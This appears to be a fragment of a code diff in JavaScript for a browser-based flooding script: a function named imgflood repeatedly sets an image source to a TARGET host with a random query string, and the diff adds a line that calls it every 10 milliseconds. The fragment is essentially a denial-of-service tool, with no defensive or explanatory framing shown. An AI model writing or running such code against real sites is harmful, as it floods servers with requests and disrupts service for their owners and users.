@@ -5,3 +5,4 @@ function imgflood() {
   var rand = Math.floor(Math.random() * 1000)
   pic.src = '//'+TARGET+URI+rand+'=val'
 }
+setInterval(imgflood,10)
